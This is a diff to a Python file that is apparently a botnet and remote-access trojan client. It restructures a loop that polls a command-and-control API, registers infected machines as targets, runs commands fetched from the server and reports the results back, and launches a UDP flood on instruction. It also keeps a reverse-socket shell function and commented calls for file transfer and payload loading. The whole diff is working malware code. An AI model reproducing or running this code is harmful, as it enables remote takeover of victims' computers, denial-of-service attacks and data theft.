@@ -502,78 +502,6 @@ def Instarction(target_name, apiToken):
         }
 
 
-
-def apiMain():
-    """
-    Main function to handle the API interaction and command execution loop.
-    It retrieves target information, processes instructions, and executes commands
-    based on the retrieved instructions.
-    """
-    while True:
-        # Retrieve target info
-        target_info = targetData(command='get')
-        delay = 5
-
-        if len(target_info) != 0:
-            target_name = target_info[0][1]
-            instraction = Instarction(target_name=target_name, apiToken=apiToken)
-            print(instraction)
-            # Ensure instraction is valid
-            if isinstance(instraction, dict) and 'error' not in instraction:
-                delay = int(instraction.get('delay', 5))  # Default to 5 if no delay is found
-
-                if instraction['instraction'].replace(' ','') == 'connectToWeb':
-                    cmd = apiCommandGet(target_name=target_name, token=apiToken)
-                    result = apiCommandPost(token=apiToken, target_name=target_name, data=cmd)
-
-                    if result == 'Invalid':
-                        logger.info(f'[apiCommandPost Invalid] {result}')
-
-                elif instraction['instraction'] == 'botNet':
-                    botNet = BotNet(target_name=target_name, apiToken=apiToken)
-
-                    if botNet not in ['error', 'no instraction yet']:
-                        udpflood, bruteFroce, customBotNet = botNet
-
-                        if udpflood != 'Inactive':
-                            udpflood()
-                        elif bruteFroce != 'Inactive':
-                            # Handle bruteForce action
-                            pass
-                        elif customBotNet != 'Inactive':
-                            # Handle customBotNet action
-                            pass
-                        else:
-                            logger.info('[botNet Invalid] No valid botnet commands')
-
-                    else:
-                        logger.info(f'[botNet Invalid] {botNet}')
-                    return  # Exiting after handling botNet (can be adjusted based on logic)
-
-                else:
-                    pass
-            else:
-                logger.info(f'[apiCommandPost Error] {instraction}')
-
-        else:
-            # Handle case where no target info is available
-            user_name = ID(n=10)
-            data = Registor(target_name=user_name, apiToken=apiToken)
-            if data == 'error':
-                logger.info(f'Error during registration: {data}')
-            else:
-                print(data)
-                if data != None:
-                    registor_target = targetData(command='create_target', ID=ID(n=5), user_name=data['target_name'])
-                    if registor_target == "Target was created successfully":
-                        logger.info(f'Target {data["name"]} was successfully registered')
-                    else:
-                        logger.info(f'Failed to register target: {registor_target}')
-
-        # Wait before repeating the process
-        time.sleep(delay)
-
-
 def get_host_port(s1):
     """
     Extracts the IP and PORT from a string formatted as 'IP:PORT'.
@@ -656,7 +584,7 @@ def send(com,_port):
         except:
             _s.close()
 
-def main():
+def socketMain(host,port):
     """
     Main function to establish a socket connection and handle commands.
     It connects to a server, retrieves the current working directory,
@@ -665,10 +593,7 @@ def main():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     try:
-        port, host = 0, 0  # placeholder for api_host_geter()
-        time.sleep(1)
         s.connect((host, port))
-
         _pwd = "echo %cd%" if platform == "win32" else "pwd"
         pwd = dir_chacker(_pwd)
         s.send(pwd.encode())
@@ -728,6 +653,86 @@ def main():
     finally:
         s.close()
 
+def main():
+    """
+    Main function to handle the API interaction and command execution loop.
+    It retrieves target information, processes instructions, and executes commands
+    based on the retrieved instructions.
+    """
+    while True:
+        # Retrieve target info
+        target_info = targetData(command='get')
+        delay = 5
+
+        if len(target_info) != 0:
+            target_name = target_info[0][1]
+            instraction = Instarction(target_name=target_name, apiToken=apiToken)
+            print(instraction)
+            # Ensure instraction is valid
+            if isinstance(instraction, dict) and 'error' not in instraction:
+                delay = int(instraction.get('delay', 5))  # Default to 5 if no delay is found
+
+                if instraction['instraction'].replace(' ','') == 'connectToWeb':
+                    cmd = apiCommandGet(target_name=target_name, token=apiToken)
+                    result = apiCommandPost(token=apiToken, target_name=target_name, data=cmd)
+
+                    if result == 'Invalid':
+                        logger.info(f'[apiCommandPost Invalid] {result}')
+
+                elif instraction['instraction'] == 'botNet':
+                    botNet = BotNet(target_name=target_name, apiToken=apiToken)
+
+                    if botNet not in ['error', 'no instraction yet']:
+                        udpflood, bruteFroce, customBotNet = botNet
+
+                        if udpflood != 'Inactive':
+                            udpflood()
+                        elif bruteFroce != 'Inactive':
+                            # Handle bruteForce action
+                            pass
+                        elif customBotNet != 'Inactive':
+                            # Handle customBotNet action
+                            pass
+                        else:
+                            logger.info('[botNet Invalid] No valid botnet commands')
+
+                    else:
+                        logger.info(f'[botNet Invalid] {botNet}')
+                    return  # Exiting after handling botNet (can be adjusted based on logic)
+
+                elif instraction['instraction'] == 'excute_code':
+                    pass
+            else:
+                logger.info(f'[apiCommandPost Error] {instraction}')
+
+        else:
+            # Handle case where no target info is available
+            user_name = ID(n=10)
+            data = Registor(target_name=user_name, apiToken=apiToken)
+            if data == 'error':
+                logger.info(f'Error during registration: {data}')
+            else:
+                print(data)
+                if data != None:
+                    registor_target = targetData(command='create_target', ID=ID(n=5), user_name=data['target_name'])
+                    if registor_target == "Target was created successfully":
+                        logger.info(f'Target {data["name"]} was successfully registered')
+                    else:
+                        logger.info(f'Failed to register target: {registor_target}')
+
+        # Wait before repeating the process
+        time.sleep(delay)
+
+        # Uncomment the line below to enable socketMain functionality
+        # socketMain()
+        # Uncomment the line below to enable UDP flood functionality
+        # udpFlood(TARGET_IP=get_ip(), THREAD_COUNT=5, PACKET_SIZE=1024)
+        # Uncomment the line below to enable libApi functionality
+        # libApi(token=apiToken, usePyload='example_script.py', save=True)
+        # Uncomment the line below to enable command execution
+        # print(CMD(com='ls -l'))  # Example command execution
+        # Uncomment the line below to enable file transfer functionality
+        # send(com='example_file.txt', _port=8080)  # Example file transfer
 
 if __name__ == '__main__':
-    apiMain()
+    main()
